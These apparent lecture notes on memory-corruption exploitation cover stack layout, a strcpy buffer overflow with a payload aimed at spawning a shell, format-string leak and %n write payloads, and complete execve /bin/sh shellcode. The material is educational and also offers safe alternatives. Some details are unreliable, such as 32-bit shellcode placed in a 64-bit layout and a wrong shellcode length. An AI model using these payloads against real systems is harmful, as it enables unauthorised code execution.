MEMORY FUNDAMENTALS

High Addresses (0x7FFFFFFFFFFF)
┌────────────────────────────────────┐
│         Kernel Space                │  ← OS kernel memory
│      (Protected from user)          │
├────────────────────────────────────┤  0x00007FFFFFFFFFFF
│                                     │
│         Stack                       │  ← Local variables
│         ↓ grows downward            │    Function calls
│                                     │    Return addresses
├────────────────────────────────────┤
│                                     │
│         (unused space)              │
│                                     │
├────────────────────────────────────┤
│         ↑ grows upward              │
│         Heap                        │  ← malloc(), new
│                                     │    Dynamic allocation
├────────────────────────────────────┤
│         BSS Segment                 │  ← Uninitialized
│         (Zero-initialized)          │    global variables
├────────────────────────────────────┤
│         Data Segment                │  ← Initialized
│         (Initialized data)          │    global/static vars
├────────────────────────────────────┤
│         Text Segment                │  ← Program code
│         (Read-only code)            │    (executable)
└────────────────────────────────────┘  0x0000000000400000
Low Addresses


CPU Registers (x86-64)
Essential Registers for Exploitation:

┌──────────────────────────────────────────────┐
│  Instruction Pointer                         │
│  ├─ RIP (64-bit) / EIP (32-bit)             │
│  └─ Points to next instruction to execute   │
├──────────────────────────────────────────────┤
│  Stack Pointer                               │
│  ├─ RSP (64-bit) / ESP (32-bit)             │
│  └─ Points to top of stack                  │
├──────────────────────────────────────────────┤
│  Base Pointer                                │
│  ├─ RBP (64-bit) / EBP (32-bit)             │
│  └─ Points to base of current stack frame   │
├──────────────────────────────────────────────┤
│  General Purpose                             │
│  ├─ RAX/RBX/RCX/RDX                         │
│  └─ Used for data manipulation              │
└──────────────────────────────────────────────┘

Stack Frame Structure:

High Memory Addresses
┌──────────────────────────────────┐
│   Function Arguments              │  ← Parameters passed
│   (arg1, arg2, ...)               │
├──────────────────────────────────┤
│   Return Address                  │  ← Where to jump back
│   (saved RIP/EIP)                 │    CRITICAL for exploits
├──────────────────────────────────┤
│   Saved Base Pointer              │  ← Previous frames RBP
│   (saved RBP/EBP)                 │
├──────────────────────────────────┤  ← Current RBP points here
│   Local Variables                 │
│   (var1, var2, ...)               │
├──────────────────────────────────┤
│   Buffers                         │  ← VULNERABLE area
│   (char buffer[64])               │
└──────────────────────────────────┘  ← RSP points here
Low Memory Addresses


Function Call Example :


int add(int a, int b) {
    int result;
    result = a + b;
    return result;
}

int main() {
    int x = 5;
    int y = 3;
    int sum = add(x, y);
    return 0;
}
```

**Stack Evolution:**
```
STEP 1: Before calling add()
┌─────────────────┐
│   y = 3         │  ← mains locals
│   x = 5         │
└─────────────────┘

STEP 2: Arguments pushed
┌─────────────────┐
│   b = 3         │  ← arg2
│   a = 5         │  ← arg1
│   y = 3         │
│   x = 5         │
└─────────────────┘

STEP 3: CALL instruction
┌─────────────────┐
│   Return Addr   │  ← 0x08048500
│   b = 3         │
│   a = 5         │
│   y = 3         │
│   x = 5         │
└─────────────────┘

STEP 4: Function prologue
┌─────────────────┐
│   result        │  ← local var
│   Saved RBP     │
│   Return Addr   │
│   b = 3         │
│   a = 5         │
└─────────────────┘

STEP 5: After RET instruction
┌─────────────────┐
│   sum = 8       │  ← back in main
│   y = 3         │
│   x = 5         │
└─────────────────┘


STACK & BUFFER OVERFLOW

#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];           // 64 bytes allocated
    strcpy(buffer, input);     // NO bounds checking!
    printf("You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable_function(argv[1]);
    return 0;
}

Safe Alternative:

strncpy(buffer, input, sizeof(buffer) - 1);
buffer[sizeof(buffer) - 1] = '\0';
```

---

Stack State - Normal Operation**
```
═══════════════════════════════════════════════
    NORMAL EXECUTION (Input: "Hello" - 5 bytes)
═══════════════════════════════════════════════

Memory Layout:                    Addresses
┌────────────────────────────┐   0x7fffffffe180
│  argv[1] = "Hello"         │   
├────────────────────────────┤   0x7fffffffe170
│  Return Address:           │   
│  0x0000000008048500        │   ← Back to main()
├────────────────────────────┤   0x7fffffffe168
│  Saved RBP:                │   
│  0x00007fffffffe100        │   ← Previous frame
├────────────────────────────┤   0x7fffffffe160
│                            │
│  buffer[0-4]: 'H''e''l'    │   
│               'l''o'       │
│  buffer[5]:   '\0'         │   
│  buffer[6-63]: [UNUSED]    │   ← Garbage/zeros
│                            │
└────────────────────────────┘   0x7fffffffe120

Status: ✅ SAFE
- Buffer contains only 6 bytes (5 chars + null)
- No overflow occurred
- Return address intact
- Program will return normally to main()
```

---

**Slide 11: Stack State - Buffer Overflow**
```
═══════════════════════════════════════════════
  OVERFLOW EXECUTION (Input: 'A' × 80 bytes)
═══════════════════════════════════════════════

Memory Layout:                    Addresses
┌────────────────────────────┐   0x7fffffffe180
│  argv[1] = "AAA...AAA"     │   (80 As)
├────────────────────────────┤   0x7fffffffe170
│  Return Address:           │   
│  0x4141414141414141 ❌     │   ← CORRUPTED!
│  (was 0x08048500)          │      "AAAAAAAA"
├────────────────────────────┤   0x7fffffffe168
│  Saved RBP:                │   
│  0x4141414141414141 ❌     │   ← CORRUPTED!
├────────────────────────────┤   0x7fffffffe160
│                            │
│  buffer[0-63]:             │
│  AAAAAAAAAAAAAAAAAAAAAA    │   ← Filled (64 bytes)
│  AAAAAAAAAAAAAAAAAAAAAA    │
│  AAAAAAAAAAAA              │
│                            │
│  OVERFLOW ZONE:            │
│  buffer[64-71]: AAAAAAAA   │   ← Overwrites RBP!
│  buffer[72-79]: AAAAAAAA   │   ← Overwrites Return!
└────────────────────────────┘   0x7fffffffe120

Status: ❌ CRASHED
- Buffer exceeded by 16 bytes
- Saved RBP overwritten with 0x4141414141414141
- Return address overwritten with 0x4141414141414141
- CPU tries to jump to 0x4141414141414141
- Invalid address → SEGMENTATION FAULT
```

**What happens:**
```
Program flow:
1. vulnerable_function() finishes
2. Executes RET instruction
3. Pops return address from stack: 0x4141414141414141
4. CPU sets RIP = 0x4141414141414141
5. Tries to fetch instruction from invalid address
6. SEGFAULT! Program crashes
```

---

Controlled Exploitation**

**Goal:** Instead of crashing, redirect execution to our code!

**Strategy:**
1. Calculate exact offset to return address (72 bytes)
2. Place shellcode in memory
3. Overwrite return address with shellcode location
4. Program jumps to our shellcode → shell access!
```
═══════════════════════════════════════════════
           EXPLOITATION PAYLOAD STRUCTURE
═══════════════════════════════════════════════

Offset    Content              Purpose
───────────────────────────────────────────────
0-63      'A' × 64            Fill buffer completely
64-71     'B' × 8             Overwrite saved RBP (dont care)
72-79     0x7fffffffe1a0      Overwrite return address
                              → Points to our shellcode!
80-110    \x31\xc0\x50...     Shellcode (execve /bin/sh)
───────────────────────────────────────────────

Memory after exploitation:
┌────────────────────────────┐   0x7fffffffe1a0
│  Shellcode starts here:    │   ← Return addr points here!
│  \x31\xc0\x50\x68\x2f...   │
├────────────────────────────┤   0x7fffffffe170
│  Return Address:           │   
│  0x00007fffffffe1a0 ✅     │   ← Controlled!
├────────────────────────────┤   0x7fffffffe168
│  Saved RBP: 0x4242... ✅   │   
├────────────────────────────┤   0x7fffffffe160
│  buffer: AAA...AAA ✅      │   
└────────────────────────────┘   0x7fffffffe120

Execution Flow:
vulnerable_function() ends
    ↓
RET pops 0x7fffffffe1a0
    ↓
RIP = 0x7fffffffe1a0
    ↓
Execute shellcode
    ↓
Shell spawned! 🎯


Printf Family Overview :

int printf(const char *format, ...);
int fprintf(FILE *stream, const char *format, ...);
int sprintf(char *str, const char *format, ...);
int snprintf(char *str, size_t size, const char *format, ...);
```

**Format Specifiers:**
```
%d    - Decimal integer
%x    - Hexadecimal integer
%s    - String (reads from pointer)
%p    - Pointer address
%n    - Write number of bytes printed to pointer
%c    - Character

int age = 25;
printf("Age: %d\n", age);  ✅ SAFE
// Output: Age: 25

char user_input[100];
gets(user_input);
printf(user_input);  ❌ DANGEROUS!
// User controls format string!


#include <stdio.h>

void vulnerable(char *input) {
    printf(input);  // BUG: user controls format!
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    return 0;
}

Safe Version:


void safe(char *input) {
    printf("%s", input);  // ✅ User input treated as data
}

Attack 1: Stack Leaking
# Normal input
$ ./vuln "Hello"
Hello

# Leak stack with %x
$ ./vuln "AAAA.%x.%x.%x.%x"
AAAA.ffffe180.8048500.41414141.252e7825

# What happened?
Input: "AAAA.%x.%x.%x.%x"
       └─┬─┘ └────┬─────┘
         │        └─ Format specifiers
         └─ Marker (0x41414141)

Stack view:
┌──────────────┐
│ 0x252e7825   │ ← 4th %x reads this
│ 0x41414141   │ ← 3rd %x reads this (our "AAAA"!)
│ 0x08048500   │ ← 2nd %x reads this
│ 0xffffe180   │ ← 1st %x reads this
│ format ptr   │
└──────────────┘

Attack 2: Arbitrary Memory Read

# Read address 0x08049000
$ ./vuln $(python -c 'print("\x00\x90\x04\x08" + "%3$s")')
<contents of 0x08049000>

# Explanation:
"\x00\x90\x04\x08"  ← Address to read (little-endian)
"%3$s"               ← Read string at 3rd argument position

Attack 3: Arbitrary Memory Write with %n

int count;
printf("Hello%n\n", &count);
// count = 5 (because "Hello" is 5 characters)

Exploitation:

# Goal: Write 0xdeadbeef to address 0x08049000


# Payload structure:
[Target Address][Padding][%n specifier]

# Example:
$ ./vuln $(python -c 'print("\x00\x90\x04\x08" + "AAAA" + "%4$n")')

# What happens:
1. "\x00\x90\x04\x08" placed on stack (target address)
2. "AAAA" printed (4 bytes)
3. %4$n writes 8 (total bytes) to address 0x08049000

Writing Large Values:

# To write 0xdeadbeef (3735928559 in decimal)
target = 0x08049000

# Split into 2 writes (for efficiency)
# Write 0xdead to target
# Write 0xbeef to target+2

payload = p32(target) + p32(target + 2)
payload += "%56813x"   # Print 56813 chars (0xdead - 8)
payload += "%4$hn"     # Write short to first address
payload += "%8378x"    # Print 8378 more (0xbeef - 0xdead)
payload += "%5$hn"     # Write short to second address



Checksec Analysis 


ASLR : Randomisation addresses
NX : Stack non-exécutable
Stack Canary :  Détecte overflow  Pas de shellcode direct
PIE :   Addresses imprévisibles
RELRO: Read-Only GOT , Pas de GOT overwrite



SHELLCODE.ASM - Complete Code


Execute this command in Linux:
/bin/sh

Using syscall:
execve("/bin/sh", NULL, NULL)



section .text
global _start

_start:
    
    xor eax, eax        
    xor ebx, ebx        
    xor ecx, ecx        
    xor edx, edx        
    
   
    push eax            
    push 0x68732f2f     
    push 0x6e69622f     
    
    
    mov ebx, esp        
    mov ecx, eax        
    mov edx, eax        
    mov al, 0x0b        
    int 0x80           


    char shellcode[] = 
    "\x31\xc0"              // xor eax,eax
    "\x31\xdb"              // xor ebx,ebx
    "\x31\xc9"              // xor ecx,ecx
    "\x31\xd2"              // xor edx,edx
    "\x50"                  // push eax
    "\x68\x2f\x2f\x73\x68"  // push 0x68732f2f
    "\x68\x2f\x62\x69\x6e"  // push 0x6e69622f
    "\x89\xe3"              // mov ebx,esp
    "\x89\xc1"              // mov ecx,eax
    "\x89\xc2"              // mov edx,eax
    "\xb0\x0b"              // mov al,0xb
    "\xcd\x80";             // int 0x80

// Length: 25 bytes
// NULL bytes: 0 ✅
